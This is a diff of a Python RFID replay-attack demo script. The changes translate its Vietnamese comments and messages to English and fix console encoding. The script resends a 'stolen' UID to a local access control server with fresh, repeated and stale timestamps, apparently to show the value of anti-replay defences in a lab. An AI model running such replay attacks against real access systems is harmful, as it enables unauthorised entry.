@@ -1,24 +1,29 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-Replay Attack Tool — gửi lại UID đã bắt được tới Access Control Server
-Dùng để chứng minh lỗ hổng khi server không có anti-replay.
+Replay Attack Tool - Send captured RFID UID back to Access Control Server
+Demonstrates vulnerability when server has no anti-replay protection.
 
 Usage:
     python replay_attack.py              # Tấn công AC thường (port 7001) — VULNERABLE
     python replay_attack.py --secure     # Tấn công Secure AC (port 7002) — BLOCKED
 """
 
-import socket, json, time, sys
+import socket, json, time, sys, io
 from datetime import datetime
 from colorama import Fore, init
 init(autoreset=True)
+
+# Fix Windows CP1252 encoding issue
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
+sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
 
 # Chọn port theo argument
 SECURE_MODE = '--secure' in sys.argv
 AC_HOST = '127.0.0.1'
 AC_PORT = 7002 if SECURE_MODE else 7001
 
-STOLEN_UID = 'A1B2C3D4E5'   # UID bắt được từ eavesdropper
+STOLEN_UID = 'A1B2C3D4E5'   # UID captured from eavesdropper
 
 
 class ReplayAttack:
@@ -67,45 +72,45 @@ def send_auth(uid: str, timestamp: float) -> dict:
 
 
 if __name__ == "__main__":
-    mode_label = f"SECURE AC (port {AC_PORT}) — Defense ON" if SECURE_MODE else f"AC Server (port {AC_PORT}) — No Defense"
+    mode_label = f"SECURE AC (port {AC_PORT}) - Defense ON" if SECURE_MODE else f"AC Server (port {AC_PORT}) - No Defense"
     print(f"{Fore.RED}=== RFID Replay Attack ===")
     print(f"{Fore.CYAN}Target: {mode_label}\n")
 
-    # Bước 1: Mô phỏng bắt frame từ eavesdropper
+    # Step 1: Simulate frame capture from eavesdropper
     replay = ReplayAttack()
     replay.capture_frame({"uid": STOLEN_UID, "command": "AUTH"})
 
-    # Bước 2: Lần 1 — gửi với timestamp hiện tại (giả lập lần xác thực đầu)
+    # Step 2: Attempt 1 - fresh timestamp (legitimate first auth)
     ts = time.time()
-    print(f"{Fore.YELLOW}[*] Sending AUTH lần 1 (timestamp hợp lệ: {ts:.1f})...")
+    print(f"{Fore.YELLOW}[*] Attempt 1 - fresh timestamp ({ts:.1f})...")
     try:
         resp1 = send_auth(STOLEN_UID, ts)
         color = Fore.GREEN if resp1.get('status') == 'GRANTED' else Fore.RED
-        print(f"{color}[Lần 1] → {resp1.get('status')} {resp1.get('owner','')}")
+        print(f"{color}[Attempt 1] -> {resp1.get('status')} {resp1.get('owner','')}")
     except Exception as e:
-        print(f"{Fore.RED}[Lần 1] Kết nối thất bại: {e}")
+        print(f"{Fore.RED}[Attempt 1] Connection failed: {e}")
         sys.exit(1)
 
-    # Bước 3: Lần 2 — REPLAY cùng timestamp (attacker phát lại)
-    print(f"\n{Fore.RED}[*] REPLAY: Gửi lại AUTH với CÙNG timestamp ({ts:.1f})...")
+    # Step 3: Attempt 2 - REPLAY same timestamp (attacker replays)
+    print(f"\n{Fore.RED}[*] REPLAY: Resend AUTH with SAME timestamp ({ts:.1f})...")
     try:
         resp2 = send_auth(STOLEN_UID, ts)
         color = Fore.GREEN if resp2.get('status') == 'GRANTED' else Fore.RED
-        icon = '⚠️  TẤN CÔNG THÀNH CÔNG' if resp2.get('status') == 'GRANTED' else '✅ BỊ CHẶN'
-        print(f"{color}[Lần 2 - Replay] → {resp2.get('status')} — {resp2.get('msg', resp2.get('owner', ''))} {icon}")
+        icon = '[!] ATTACK SUCCEEDED' if resp2.get('status') == 'GRANTED' else '[OK] BLOCKED'
+        print(f"{color}[Attempt 2 - Replay] -> {resp2.get('status')} - {resp2.get('msg', resp2.get('owner', ''))} {icon}")
     except Exception as e:
-        print(f"{Fore.RED}[Lần 2] Kết nối thất bại: {e}")
+        print(f"{Fore.RED}[Attempt 2] Connection failed: {e}")
 
-    # Bước 4: Lần 3 — timestamp cũ (100 giây trước)
+    # Step 4: Attempt 3 - old timestamp (100s ago)
     old_ts = time.time() - 100
-    print(f"\n{Fore.RED}[*] REPLAY với timestamp CŨ (100 giây trước: {old_ts:.1f})...")
+    print(f"\n{Fore.RED}[*] REPLAY with OLD timestamp (100s ago: {old_ts:.1f})...")
     try:
         resp3 = send_auth(STOLEN_UID, old_ts)
         color = Fore.GREEN if resp3.get('status') == 'GRANTED' else Fore.RED
-        icon = '⚠️  TẤN CÔNG THÀNH CÔNG' if resp3.get('status') == 'GRANTED' else '✅ BỊ CHẶN'
-        print(f"{color}[Lần 3 - Old TS] → {resp3.get('status')} — {resp3.get('msg', resp3.get('owner', ''))} {icon}")
+        icon = '[!] ATTACK SUCCEEDED' if resp3.get('status') == 'GRANTED' else '[OK] BLOCKED'
+        print(f"{color}[Attempt 3 - Old TS] -> {resp3.get('status')} - {resp3.get('msg', resp3.get('owner', ''))} {icon}")
     except Exception as e:
-        print(f"{Fore.RED}[Lần 3] Kết nối thất bại: {e}")
+        print(f"{Fore.RED}[Attempt 3] Connection failed: {e}")
 
-    print(f"\n{Fore.CYAN}Replays attempted: {replay.get_replay_count()}")
+    print(f"\n{Fore.CYAN}Total replays attempted: {replay.get_replay_count()}")
 
